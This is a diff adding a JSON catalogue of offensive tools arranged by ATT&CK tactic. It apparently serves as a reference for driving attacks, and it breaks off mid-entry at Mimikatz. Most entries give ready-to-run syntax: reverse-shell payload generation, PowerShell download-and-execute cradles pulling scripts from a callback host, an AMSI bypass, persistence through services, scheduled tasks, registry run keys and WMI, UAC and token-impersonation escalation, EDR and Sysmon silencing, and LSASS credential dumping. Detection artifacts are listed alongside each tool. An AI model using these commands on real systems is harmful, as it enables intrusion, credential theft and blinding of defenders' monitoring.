@@ -1,0 +1,554 @@
+{
+  "TA0002": {
+    "tactic": "execution",
+    "description": "Running malicious code on target systems to achieve adversary objectives. Execution tactics often pair with initial access to run code remotely or locally.",
+    "comes_after": "Command and Control or Initial Access",
+    "comes_before": "Persistence or Privilege Escalation",
+    "tools": [
+      {
+        "name": "Empire",
+        "category": "C2 Framework",
+        "description": "PowerShell and Python post-exploitation framework. Provides agents that execute modules for credential theft, lateral movement, and persistence. Supports multiple listener types including HTTP, HTTPS, DNS, and named pipes.",
+        "common_syntax": "usestager windows/launcher_bat; set Listener http; execute",
+        "output_parsing": "Look for 'Agent' prefix followed by alphanumeric ID in console output. Successful callbacks show '(Empire: agents) >' prompt with new agent listed. Task results appear under 'results' key in JSON output.",
+        "artifacts": "PowerShell script block logging (Event ID 4104), network connections to C2 server on configured listener port, staged launcher files (.bat/.ps1) in temp directories"
+      },
+      {
+        "name": "Covenant",
+        "category": "C2 Framework",
+        "description": ".NET C2 framework with a web-based team server interface. Uses Grunt agents compiled with Roslyn and supports dynamic compilation at runtime. Provides built-in REcon scripts for automated post-exploitation.",
+        "common_syntax": "Grunt> shell whoami /all; Grunt> connect tcp://10.0.0.5:4444",
+        "output_parsing": "Grunt names are randomly generated GUIDs. Task output appears in the 'Output' column of the Grunt view. Status transitions: 'Uninitialized' -> 'Stage0' -> 'Stage1' -> 'Active'.",
+        "artifacts": ".NET assembly loads via Assembly.Load, HTTPS connections to Covenant team server, Roslyn compile artifacts in temp paths, AMSI trigger on reflective assembly loading"
+      },
+      {
+        "name": "Sliver",
+        "category": "C2 Framework",
+        "description": "Open-source C2 framework written in Go. Supports mTLS, WireGuard, DNS, and HTTP(S) protocols. Implant generation produces compiled binaries with embedded operator certificates for mutual authentication.",
+        "common_syntax": "generate --http 10.0.0.5:443 --os windows; use <implant_id>; shell whoami",
+        "output_parsing": "Implant sessions listed with 'SID' prefix. Command output returned inline. Use 'sessions' command to list active implants. 'Jobs' shows active listeners. Status: 'Active' or 'Closed'.",
+        "artifacts": "Go binary implants with embedded TLS certificates, WireGuard tunnel traffic on UDP 53 or custom ports, mTLS handshake fingerprints, implant config blobs decodable from binary metadata"
+      },
+      {
+        "name": "msfvenom",
+        "category": "Payload Generator",
+        "description": "Metasploit standalone payload generator producing shellcode, executables, and scripts in multiple formats. Supports encoding, encryption, and custom iteration counts for evasion. Integrates with Metasploit handlers for callback.",
+        "common_syntax": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe; msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f csharp",
+        "output_parsing": "Generated file written to specified output path. Shellcode formats (c, csharp, python, ruby) print hex strings to stdout. Use '-l payloads' to enumerate available payloads. Error messages indicate missing dependencies or invalid format combinations.",
+        "artifacts": "Secondary staged payload fetch over HTTP, Metasploit handler connection on specified LHOST:LPORT, common encoder signatures in PE sections (shikata_ga_nai NOP sled patterns), AV detection of known MSF template hashes"
+      },
+      {
+        "name": "mshta.exe",
+        "category": "Living-off-the-Land Binary (LOLBIN)",
+        "description": "Native Windows binary that executes HTML Application (HTA) files. Adversaries abuse mshta.exe to bypass application whitelisting since it is a trusted Microsoft-signed binary that can execute inline VBScript or JavaScript without writing files to disk.",
+        "common_syntax": "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://10.0.0.5/stage.ps1''\\)\"\":close\"); mshta http://10.0.0.5/malicious.hta",
+        "output_parsing": "No stdout output from mshta.exe itself. Check for mshta.exe process with command-line arguments containing URLs or inline script. Parent process is typically cmd.exe or powershell.exe in attack scenarios.",
+        "artifacts": "Event ID 4688 with mshta.exe process creation, command-line logging showing HTTP URLs or vbscript: syntax, network connection to remote HTA file host, AMSI capture of script content on Windows 10+"
+      },
+      {
+        "name": "certutil.exe",
+        "category": "Living-off-the-Land Binary (LOLBIN)",
+        "description": "Native Windows certificate utility repurposed for downloading files and decoding base64 payloads. The -urlcache and -decode flags enable arbitrary file transfer without third-party tools. Often used as a download cradle in multi-stage payloads.",
+        "common_syntax": "certutil -urlcache -split -f http://10.0.0.5/payload.exe C:\\\\Windows\\\\Temp\\\\payload.exe; certutil -decode encoded_payload.txt decoded_payload.exe",
+        "output_parsing": "Successful download prints 'CertUtil: -urlcache command completed successfully.' Decode prints 'CertUtil: -decode command completed successfully.' Check download size matches source with 'CertUtil: -urlcache' verbose output.",
+        "artifacts": "Event ID 4688 with certutil.exe and -urlcache or -decode arguments, file creation in temp directories, network connection to payload host URL, Prefetch entry for certutil.exe execution"
+      },
+      {
+        "name": "bitsadmin.exe",
+        "category": "Living-off-the-Land Binary (LOLBIN)",
+        "description": "Windows Background Intelligent Transfer Service command-line tool used to create and manage download/upload jobs. Adversaries leverage BITS jobs because they persist across reboots, use system-level bandwidth throttling to avoid detection, and execute from a trusted Microsoft binary.",
+        "common_syntax": "bitsadmin /transfer eviljob /download /priority high http://10.0.0.5/payload.exe C:\\\\Windows\\\\Temp\\\\payload.exe; bitsadmin /create update; bitsadmin /addfile update http://10.0.0.5/payload.exe C:\\\\Windows\\\\Temp\\\\payload.exe; bitsadmin /resume update",
+        "output_parsing": "Monitor job progress with 'bitsadmin /info <jobname> /verbose'. Transfer completion shows 'TRANSFERRED' state. Error states include 'TRANSIENT_ERROR' and 'PERMANENT_ERROR'. Job files visible at 'C:\\\\ProgramData\\\\Microsoft\\\\Network\\\\Downloader\\\\'.",
+        "artifacts": "BITS job creation logged in Event ID 16396 (BITS client), file system artifacts in Downloader directory, network connection to payload host, scheduled task or startup persistence for BITS job completion callback"
+      },
+      {
+        "name": "PowerShell (Reflection Loading)",
+        "category": "Scripting Engine",
+        "description": "Using PowerShell's [System.Reflection.Assembly]::Load() or IEX with byte arrays to execute .NET assemblies entirely in memory without touching disk. Combined with AMSI bypass techniques, this provides stealthy in-memory execution of post-exploitation tools.",
+        "common_syntax": "[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('<base64_encoded_dll>')); [Namespace.Class]::Method(); IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1')",
+        "output_parsing": "Reflection load returns an Assembly object. Method invocation output appears in the PowerShell console stream. Error messages from failed loads include 'FileLoadException' or 'BadImageFormatException'. Successful execution of Mimikatz via reflection shows 'Invoke-Mimikatz' output inline.",
+        "artifacts": "PowerShell script block logging (Event ID 4104) capturing the reflection command, AMSI trigger (Event ID 33162 on failure), large PowerShell process memory footprint, no file on disk corresponding to loaded assembly, parent process command-line revealing encoded or obfuscated content"
+      }
+    ]
+  },
+  "TA0003": {
+    "tactic": "persistence",
+    "description": "Techniques that adversaries use to maintain access to systems across restarts, credential changes, and other interruptions. Persistence mechanisms ensure continued access even if the initial entry vector is closed.",
+    "comes_after": "Execution or Initial Access",
+    "comes_before": "Privilege Escalation or Credential Access",
+    "tools": [
+      {
+        "name": "SharPersist",
+        "category": "Persistence Toolkit",
+        "description": "C# persistence toolkit by FireEye/Mandiant that automates common Windows persistence techniques. Supports scheduled tasks, registry run keys, startup folder, WMI event subscriptions, service creation, and COM hijacking through a unified CLI interface.",
+        "common_syntax": "SharPersist.exe -t schtask -c \"C:\\\\Windows\\\\Temp\\\\payload.exe\" -n \"WindowsUpdate\" -m add; SharPersist.exe -t reg -c \"C:\\\\Windows\\\\Temp\\\\payload.exe\" -n \"Updater\" -m add -k \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"",
+        "output_parsing": "Successful operations print '[+] Successfully added persistence' with the technique name. Error messages include '[-] Error' prefix. Use '-m list' to enumerate existing persistence entries. The '-m check' flag verifies if a specific persistence mechanism exists.",
+        "artifacts": "Registry modifications in Run/RunOnce keys (Event ID 4657), scheduled task creation (Event ID 4698), WMI event subscription objects in root\\\\subscription namespace, COM registry hijack entries modifying InprocServer32 values"
+      },
+      {
+        "name": "PowerSploit-Persistence",
+        "category": "PowerShell Framework",
+        "description": "PowerSploit's persistence module provides multiple persistence mechanisms including userland.registry, WMI event subscriptions, and scheduled tasks. The Install-SSP module injects Security Support Provider DLLs for LSA persistence. All modules support credential-encrypted storage of persistence payloads.",
+        "common_syntax": "Invoke-Persistence -PersistenceMethod Registry -FilePath C:\\\\Windows\\\\Temp\\\\payload.exe -DoNotPersistOnNetwork; Install-SSP -Path C:\\\\Windows\\\\Temp\\\\mimilib.dll",
+        "output_parsing": "Successful persistence returns the persistence object with method name and trigger details. Registry persistence confirms the key path created. WMI persistence confirms event filter, consumer, and binding names. Use Get-Persistence to enumerate installed mechanisms.",
+        "artifacts": "PowerShell script block logging (Event ID 4104), registry key creation in HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run, WMI objects in root\\\\subscription namespace (__EventFilter, __CommandLineEventConsumer, __FilterToConsumerBinding), LSA SSP registry modification"
+      },
+      {
+        "name": "schtasks.exe",
+        "category": "Living-off-the-Land Binary (LOLBIN)",
+        "description": "Native Windows Task Scheduler command-line utility. Adversaries create scheduled tasks to establish persistence by configuring tasks that run at logon, at specific intervals, or in response to system events. Supports SYSTEM context execution when run with elevated privileges.",
+        "common_syntax": "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\\\Windows\\\\Temp\\\\payload.exe\" /sc onlogon /ru System; schtasks /create /tn \"SysHelper\" /tr \"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/stage.ps1')\" /sc minute /mo 5 /ru SYSTEM",
+        "output_parsing": "Success: 'SUCCESS: The scheduled task has successfully been created.' Use 'schtasks /query /tn <taskname> /v' to verify task configuration. Failure returns 'ERROR' with specific reason code. Check 'Next Run Time' and 'Status' fields.",
+        "artifacts": "Task Scheduler event log (Event ID 4698 for task creation, 4699 for deletion), XML task definition stored in C:\\\\Windows\\\\System32\\\\Tasks\\\\, command-line logging showing /create with suspicious paths or arguments, Prefetch entry for schtasks.exe"
+      },
+      {
+        "name": "sc.exe",
+        "category": "Living-off-the-Land Binary (LOLBIN)",
+        "description": "Windows Service Control Manager command-line utility. Used to create, configure, and manage Windows services. Adversaries create services with binary paths pointing to malicious executables or command interpreters. Service persistence survives reboots and can run as SYSTEM automatically.",
+        "common_syntax": "sc create WindowsUpdate binPath= \"C:\\\\Windows\\\\Temp\\\\payload.exe\" start= auto; sc description WindowsUpdate \"Provides Windows Update functionality\"; sc start WindowsUpdate; sc config WinService binPath= \"cmd /c C:\\\\Windows\\\\Temp\\\\payload.exe\"",
+        "output_parsing": "Success: '[SC] CreateService SUCCESS'. Verify with 'sc qc <servicename>' which shows SERVICE_NAME, BINARY_PATH_NAME, and SERVICE_START_TYPE. Service status checked with 'sc query <servicename>'. Error codes: 1072 (service marked for deletion), 1057 (account name invalid).",
+        "artifacts": "System event log (Event ID 7045 for new service creation), Service Control Manager events, registry key at HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\<servicename>, file artifact at service binary path, network connection initiated by service process"
+      },
+      {
+        "name": "Registry (reg add / New-ItemProperty)",
+        "category": "Living-off-the-Land Binary (LOLBIN)",
+        "description": "Windows Registry manipulation via reg.exe or PowerShell cmdlets for Run/RunOnce key persistence, image file execution options (IFEO) hijacking, and COM object registration. Registry persistence is one of the most common techniques because it executes before user login and survives reboots.",
+        "common_syntax": "reg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"WindowsUpdate\" /t REG_SZ /d \"C:\\\\Windows\\\\Temp\\\\payload.exe\" /f; New-ItemProperty -Path HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce -Name Setup -Value C:\\\\Windows\\\\Temp\\\\payload.exe -PropertyType String",
+        "output_parsing": "reg.exe success: 'The operation completed successfully.' PowerShell: verify with 'Get-ItemProperty -Path <path> -Name <name>'. Use 'reg query <key>' to enumerate existing values. Failed access returns 'ERROR: Access is denied' for HKLM without elevation.",
+        "artifacts": "Registry audit events (Event ID 4657 for value modification), Run/RunOnce key entries under HKCU or HKLM, IFEO debugger values at HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\<target.exe>\\\\Debugger"
+      },
+      {
+        "name": "WMI Event Subscriptions (mofcomp)",
+        "category": "Persistence Mechanism",
+        "description": "Windows Management Instrumentation event subscriptions create persistent logic consisting of three components: EventFilter (trigger), EventConsumer (action), and FilterToConsumerBinding (link). Compiled via mofcomp.exe or created programmatically via WMI APIs. Persistence survives reboots because WMI repos are filesystem-backed.",
+        "common_syntax": "mofcomp.exe C:\\\\Windows\\\\Temp\\\\evil.mof; Set-WmiInstance -Class __EventFilter -Arguments @{Name='evil';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_Process\"'} -Namespace root\\\\subscription",
+        "output_parsing": "mofcomp success: 'MOF file has been successfully parsed' and 'Storing data in the repository... done'. Use 'wmic /namespace:\\\\\\\\.\\\\root\\\\subscription path __EventFilter' to list filters. Check FilterToConsumerBinding with 'wmic /namespace:\\\\\\\\.\\\\root\\\\subscription path __FilterToConsumerBinding'.",
+        "artifacts": "WMI repository modifications in C:\\\\Windows\\\\System32\\\\wbem\\\\Repository\\\\, EventFilter objects in root\\\\subscription namespace, CommandLineEventConsumer with suspicious command lines, mofcomp.exe execution logged in Process Creation (Event ID 4688)"
+      }
+    ]
+  },
+  "TA0004": {
+    "tactic": "privilege-escalation",
+    "description": "Techniques adversaries use to gain higher-level permissions on a system or network. Privilege escalation enables attackers to move from limited user context to administrator, SYSTEM, or root level access.",
+    "comes_after": "Execution or Persistence",
+    "comes_before": "Defense Evasion or Credential Access",
+    "tools": [
+      {
+        "name": "WinPEAS",
+        "category": "Privilege Escalation Scanner",
+        "description": "Windows Privilege Escalation Awesome Script that automates local privilege escalation checks. Enumerates services, registry keys, scheduled tasks, tokens, group memberships, and known misconfigurations. Provides color-coded output with exploitation suggestions and severity levels.",
+        "common_syntax": "winPEAS.exe fast; winPEAS.bat; winPEASx64.exe searchfast; cmd /c winPEAS.bat log",
+        "output_parsing": "Color-coded output: RED = high vulnerability, YELLOW = moderate, GREEN = info. Each section header shows the category. Look for 'You have a token' or 'Vulnerable' tags. Redirect to file with 'log' flag for offline analysis. The 'searchfast' flag reduces search time.",
+        "artifacts": "Process creation event (4688) for winPEAS executable, registry enumeration across multiple hives, service enumeration via SCM API calls, file access attempts to sensitive paths (C:\\\\Windows\\\\System32\\\\config\\\\SAM, etc.)"
+      },
+      {
+        "name": "LinPEAS",
+        "category": "Privilege Escalation Scanner",
+        "description": "Linux Privilege Escalation Awesome Script that checks for misconfigurations, SUID binaries, capabilities, cron jobs, container escapes, and kernel exploits. Color-coded output indicates exploitability severity. Supports automatic version detection for CVE matching.",
+        "common_syntax": "curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh; ./linpeas.sh -a 2>&1 | tee linpeas_output.txt; ./linpeas.sh -s fast",
+        "output_parsing": "Color-coded output: RED/YELLOW = immediate interest. Check 'PE' section headers for privilege escalation vectors. SUID section lists binaries with SETUID bit. Capabilities section shows files with cap_setuid. Cron section reveals writable scripts executed by root.",
+        "artifacts": "Bash process execution, extensive file system enumeration (strace shows openat syscalls), /etc/passwd and /etc/shadow read attempts, cron log access, network socket enumeration"
+      },
+      {
+        "name": "PrintSpoofer",
+        "category": "Privilege Escalation Exploit",
+        "description": "Exploits the SeImpersonatePrivilege on Windows to escalate from a service account (or low-privilege user with this privilege) to NT AUTHORITY\\\\SYSTEM. Abuses the named pipe impersonation via the Print Spooler service's RPC interface. Works on Windows 10 and Server 2016/2019.",
+        "common_syntax": "PrintSpoofer.exe -i -c \"C:\\\\Windows\\\\Temp\\\\payload.exe\"; PrintSpoofer.exe -c \"cmd /c C:\\\\Windows\\\\Temp\\\\shell.exe\"",
+        "output_parsing": "Success: '[+] Created impersonation pipe: \\\\.\\\\pipe\\\\PrintSpoofer' followed by '[+] Impersonated SYSTEM successfully' and command execution output. Failure: '[-] Failed to impersonate SYSTEM' indicates Print Spooler is disabled or privilege not held.",
+        "artifacts": "Named pipe creation with pipe name pattern, Print Spooler service RPC call (Event ID 8152 if monitored), process creation as SYSTEM from service context, SeImpersonatePrivilege present in token enumeration"
+      },
+      {
+        "name": "JuicyPotato/RoguePotato",
+        "category": "Privilege Escalation Exploit",
+        "description": "JuicyPotato exploits SeImpersonatePrivilege via COM servers with SYSTEM-level tokens on Windows 7-10 and Server 2012R2. RoguePotato is the successor that works on Windows Server 2019+ by routing NTLM authentication through an external relay. Both abuse the BITS service or custom COM servers for token impersonation.",
+        "common_syntax": "JuicyPotato.exe -l 1337 -p C:\\\\Windows\\\\Temp\\\\payload.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}; RoguePotato.exe --rpcserver 10.0.0.5 --command \"C:\\\\Windows\\\\Temp\\\\payload.exe\" --rpcport 9997",
+        "output_parsing": "JuicyPotato success: '[+] Creating pipe: <pipe_name>' then '[+] Listening...' and '[+] process started with pid <PID>'. RoguePotato success: authentication relay confirmation. Common failure: 'COM class not registered' means CLSID mismatch for this Windows version.",
+        "artifacts": "COM object activation requests (Event ID 10000), named pipe creation listening on specified port, BITS service interaction, NTLM authentication relay traffic on specified RPC port, SYSTEM-level process creation"
+      },
+      {
+        "name": "PowerUp.ps1",
+        "category": "PowerShell Privilege Escalation Framework",
+        "description": "PowerSploit module that checks for local privilege escalation vectors including unquoted service paths, weak service permissions, DLL hijacking opportunities, and stored credentials. Provides exploitation functions for each vulnerability class it identifies.",
+        "common_syntax": "Invoke-PrivescAudit; Get-UnquotedService; Get-ModifiableService; Test-ServiceDaclPermission -Name 'VulnerableSvc'; Invoke-ServiceAbuse -Name 'VulnerableSvc' -Command 'net localgroup Administrators lowpriv /add'",
+        "output_parsing": "Invoke-PrivescAudit returns objects with 'VulnType', 'Name', 'Path', and 'Exploitable' properties. Color-coded severity in console output. Get-UnquotedService lists services with unquoted paths containing spaces. Use 'Export-CSV' for structured output.",
+        "artifacts": "PowerShell script block logging (Event ID 4104), service enumeration via SCM API calls, DACL modifications on service objects (Event ID 4670), registry modifications in HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\"
+      },
+      {
+        "name": "linux-exploit-suggester",
+        "category": "Privilege Escalation Scanner",
+        "description": "Shell script that checks the local Linux kernel version against a database of known privilege escalation exploits. Matches kernel version, distribution, and architecture to suggest applicable CVEs with exploit references. Supports offline and online modes.",
+        "common_syntax": "./linux-exploit-suggester.sh; ./linux-exploit-suggester.sh --uname \"4.4.0-116-generic\"; curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash",
+        "output_parsing": "Each potential exploit shows: CVE identifier, risk level (high/medium/low), kernel version range, and exploit-db reference. Check 'yes/no' availability column for exploit proximity to target kernel. Multiple matches indicate higher risk of successful exploitation.",
+        "artifacts": "Bash process execution, uname system call for kernel version detection, /proc/version and /etc/os-release access, potential exploit binary compilation (gcc/make processes)"
+      },
+      {
+        "name": "UACMe",
+        "category": "UAC Bypass Tool",
+        "description": "Framework for bypassing Windows User Account Control through multiple known methods. Implements over 70 bypass techniques that leverage auto-elevated COM objects, DLL hijacking, and trusted path abuse. Each method is assigned an index number for reference.",
+        "common_syntax": "Akagi64.exe 23 C:\\\\Windows\\\\Temp\\\\payload.exe; Akagi32.exe 41 cmd.exe; Akagi64.exe 56 powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/stage.ps1')\"",
+        "output_parsing": "Successful bypass spawns the specified command with medium-high integrity. Check output with 'whoami /groups' to verify high integrity SID (S-1-16-12288). Method numbers reference specific bypass techniques. Error output includes 'Error' prefix with detailed failure reason.",
+        "artifacts": "COM object activation events (Event ID 10000/10001), elevated process creation with high integrity level, DLL side-loading artifacts in System32, registry modifications to COM object configurations, Event Log service abuse patterns"
+      },
+      {
+        "name": "Mimikatz (token::elevate)",
+        "category": "Credential Theft / Privilege Escalation",
+        "description": "Mimikatz's token::elevate command duplicates an existing SYSTEM token and applies it to the current thread, enabling privilege escalation without spawning a new process. Combined with sekurlsa::logonpasswords, it extracts credentials from LSASS memory. Works on systems where SeDebugPrivilege is available.",
+        "common_syntax": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"exit\"; mimikatz.exe \"privilege::debug\" \"sekurlsa::ekeys\" \"exit\"",
+        "output_parsing": "Successful privilege::debug shows 'Privilege 20 OK'. token::elevate shows 'Token : <SID> elevated to <TARGET>'. Credential extraction shows 'Username', 'Domain', and 'Password' or 'NTLM' hash fields. Kerberos keys shown with 'AES256' and 'AES128' prefixes.",
+        "artifacts": "Process access to LSASS (Event ID 4663 with Process Access), SeDebugPrivilege assertion (Event ID 4674), token duplication events, Mimikatz binary hash or memory signature, credential access audit (Event ID 4656 on LSASS handle request)"
+      }
+    ]
+  },
+  "TA0005": {
+    "tactic": "defense-evasion",
+    "description": "Techniques adversaries use to avoid detection by security products and forensic analysis. Includes obfuscation, process injection, disabling security tools, and removing evidence of compromise.",
+    "comes_after": "Privilege Escalation or Execution",
+    "comes_before": "Credential Access or Lateral Movement",
+    "tools": [
+      {
+        "name": "Invoke-Obfuscation",
+        "category": "Obfuscation Framework",
+        "description": "PowerShell obfuscation framework that applies multiple transformation layers including string encoding, token substitution, AST-based manipulation, and compression. Produces functionally equivalent but syntactically different scripts that bypass AMSI and script block logging patterns.",
+        "common_syntax": "Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/stage.ps1')} -ObfuscationLevel 3; Invoke-Obfuscation -Command 'ENCODING\\\\1' -Path .\\\\payload.ps1",
+        "output_parsing": "Outputs obfuscated PowerShell script to stdout. Layer 1-3 increases complexity. The '-Command' mode processes single commands. Use '-OutputPath' to write to file. Obfuscated output retains original functionality but uses reversed strings, type casting, and variable renames.",
+        "artifacts": "Obfuscated PowerShell script block logging (Event ID 4104) with unusual character sequences, AMSI detection attempts on deobfuscated content, large or deeply nested command lines, encoding patterns matching known Invoke-Obfuscation signatures"
+      },
+      {
+        "name": "ScareCrow/Freeze",
+        "category": "EDR Evasion Tool",
+        "description": "ScareCrow encrypts payload shellcode with AES and uses legitimate Windows-signed binaries as loaders. Freeze creates payloads that bypass EDR hooking by using indirect syscalls and syswhispers3. Both tools produce executables that avoid common static and behavioral detection signatures.",
+        "common_syntax": "ScareCrow -I payload.bin -Loader binaryname -O output.exe -domain www.example.com; Freeze -I payload.bin -O frozen.exe -sandbox -process explorer.exe; Freeze -I shellcode.bin -O payload.exe -anti-debug -anti-analysis",
+        "output_parsing": "ScareCrow outputs compiled EXE with embedded AES key. Freeze prints compilation success and technique status. Check output binary with 'file' command for PE headers. Both tools confirm encryption layer application in console output.",
+        "artifacts": "Signed binary execution (binary has valid signature), indirect syscall patterns in memory (ntdll hooks absent), encrypted shellcode blobs in .data or .rsrc sections, sandbox detection behaviors (timing checks, VM artifacts), EDR unhooking via fresh ntdll.dll mapping"
+      },
+      {
+        "name": "SysmonQuiet",
+        "category": "Telemetry Manipulation",
+        "description": "Modifies Sysmon configuration to reduce or eliminate telemetry visibility. Can disable specific event IDs, exclude processes from monitoring, or load a minimal configuration that stops logging key events. Requires administrative privileges to modify Sysmon's driver configuration.",
+        "common_syntax": "SysmonQuiet.exe -action set -filter \"ProcessCreate=0;NetworkConnect=0\"; sysmon -c -- \"C:\\\\Windows\\\\Temp\\\\empty_config.xml\"; sysmon -u; sysmon -c empty_config.xml",
+        "output_parsing": "Successful configuration change shows 'Sysmon configuration updated.' Verify with 'sysmon -c' to dump current config. Disabled events show 'Filtering rule removed' or event IDs set to 0. Empty configuration shows only schema version without rule groups.",
+        "artifacts": "Sysmon configuration modification (Event ID 16 if self-monitoring enabled), registry changes to HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\SysmonDrv\\\\Parameters, sudden drop in Sysmon event volume, Sysmon service restart (Event ID 4 in Sysmon operational log)"
+      },
+      {
+        "name": "EDRSilencer",
+        "category": "EDR Evasion Tool",
+        "description": "Uses Windows Filtering Platform (WFP) API to add filters that block EDR agent network communications. Prevents telemetry from reaching SIEM/EDR backend servers. Blocks both outbound and inbound traffic on destination ports and IPs associated with EDR solutions.",
+        "common_syntax": "EDRSilencer.exe add -process \"C:\\\\Program Files\\\\EDR\\\\agent.exe\" -direction out; EDRSilencer.exe add -ip 10.0.0.100 -port 443 -direction out; EDRSilencer.exe list",
+        "output_parsing": "Successful filter addition shows 'Filter added with ID: <n>'. 'list' command shows all WFP filters with their process/IP/port targets. 'remove' command requires the filter ID. Check 'netsh wfp show state' for WFP filter enumeration.",
+        "artifacts": "WFP filter addition visible via 'netsh wfp show state', EDR agent heartbeat failures, blocked network connections from EDR processes, EDR console showing agent offline status, Windows Filtering Platform audit events (Event ID 5441 if WFP auditing enabled)"
+      },
+      {
+        "name": "ProcessHacker/PPLcontrol",
+        "category": "Process Manipulation",
+        "description": "ProcessHacker is an advanced process viewer that can terminate protected processes when run as SYSTEM. PPLcontrol specifically manipulates Protected Process Light (PPL) levels to disable EDR processes by changing their protection level. Requires SYSTEM or appropriate PPL to operate.",
+        "common_syntax": "PPLcontrol.exe /disable EDRAgent.exe; PPLcontrol.exe /enable EDRAgent.exe /level Protected; processhacker.exe -e -c -s; PPLcontrol.exe /query EDRAgent.exe",
+        "output_parsing": "PPLcontrol success: 'Protection level changed successfully.' Query shows current protection: 'None', 'PPL', 'Protected', 'Protected-Light'. Disable removes protection level, allowing termination. ProcessHacker shows process tree with protection levels color-coded.",
+        "artifacts": "Process protection level changes (Event ID 4656 with modified ProcessId), EDR process termination events, PsProtectedProcess signature changes in EPROCESS structure, unusual processhacker.exe execution, PPL protection downgrade events"
+      },
+      {
+        "name": "AMSI Bypass Scripts",
+        "category": "Security Bypass",
+        "description": "Collection of techniques that patch AMSI (Anti-Malware Scan Interface) in memory to prevent PowerShell, VBScript, and JScript content scanning. Methods include forcing AMSI initialization failure, patching AmsiScanBuffer to return AMSI_RESULT_CLEAN, and COM object manipulation. Essential precursor to PowerShell-based attacks on Windows 10+.",
+        "common_syntax": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); sET-ItEM ('V'+'aR'+'IA'+'bL'+'e:1q6') ([TYPE]('F'+'iElD'));(vARiAbLe '1q6').GeTFiElD('aMSiInItFaIleD','NoNpubLiC,StaTIc').SeTVAlUE($nULL,[bOoL]1)",
+        "output_parsing": "Successful bypass produces no output (silent success). Verify bypass works by running a known detection string: 'Invoke-Mimikatz' should no longer trigger AMSI error. Failed bypass throws 'Exception setting amsiInitFailed' or similar errors. AMSI event 33162 indicates failed bypass attempts.",
+        "artifacts": "AMSI failure event (Event ID 33162), PowerShell script block logging with amsiInitFailed references, memory patch artifacts in PowerShell process (modified bytes in amsi.dll!AmsiScanBuffer), unusual .NET reflection patterns accessing System.Management.Automation internals"
+      },
+      {
+        "name": "Reflective DLL Injection Tools",
+        "category": "Process Injection",
+        "description": "Tools that load DLLs into a process without using the standard LoadLibrary API, avoiding module enumeration. ReflectiveLoader stub resolves imports, handles relocations, and calls DllMain entirely from memory. Used to inject post-exploitation DLLs like Mimikatz or Seatbelt without touching disk.",
+        "common_syntax": "Invoke-ReflectivePEInjection -PEUrl http://10.0.0.5/payload.dll -ProcName explorer; Invoke-ReflectivePEInjection -PEBytes ([System.IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\payload.dll')) -ProcId 1234; inject.exe -p 1234 -d payload.dll",
+        "output_parsing": "Successful injection shows '[+] DLL injected successfully' and '[+] Reflective loader executed'. Check target process module list to verify DLL is NOT visible (key benefit of reflective loading). Error cases include 'Failed to find process' or 'Access denied' for protected processes.",
+        "artifacts": "VirtualAllocEx/NtAllocateVirtualMemory calls in target process, thread creation via CreateRemoteThread or RtlCreateUserThread, memory region with RWX (PAGE_EXECUTE_READWRITE) protection, no corresponding file on disk, AMSI alert on known injection framework signatures"
+      },
+      {
+        "name": "certutil (decode)",
+        "category": "Living-off-the-Land Binary (LOLBIN)",
+        "description": "Abuse of certutil.exe's base64 decode functionality to transform encoded payloads into executable binaries on-disk. The -decode flag accepts input files containing base64-encoded content and writes decoded binary output, bypassing content inspection that only examines plaintext traffic.",
+        "common_syntax": "certutil -decode C:\\\\Windows\\\\Temp\\\\encoded_payload.b64 C:\\\\Windows\\\\Temp\\\\payload.exe; certutil -decode http://10.0.0.5/encoded.txt C:\\\\Users\\\\Public\\\\payload.exe; certutil -encode C:\\\\Windows\\\\Temp\\\\payload.exe C:\\\\Windows\\\\Temp\\\\payload.b64",
+        "output_parsing": "Success: 'CertUtil: -decode command completed successfully.' with newline showing input length and output file path. Verify output file size with 'dir' command. Encoding success: 'CertUtil: -encode command completed successfully.' Error: 'CertUtil: -decode command FAILED' with error code.",
+        "artifacts": "Process creation event (4688) with 'certutil.exe -decode', file creation events for both encoded input and decoded output, Prefetch entry for certutil.exe, file system artifacts at decoded output path"
+      }
+    ]
+  },
+  "TA0006": {
+    "tactic": "credential-access",
+    "description": "Techniques for stealing credentials like account names, passwords, hashes, and tokens. Credential access enables adversaries to masquerade as authorized users and move laterally across the network.",
+    "comes_after": "Defense Evasion or Discovery",
+    "comes_before": "Discovery or Lateral Movement",
+    "tools": [
+      {
+        "name": "Mimikatz",
+        "category": "Credential Theft Framework",
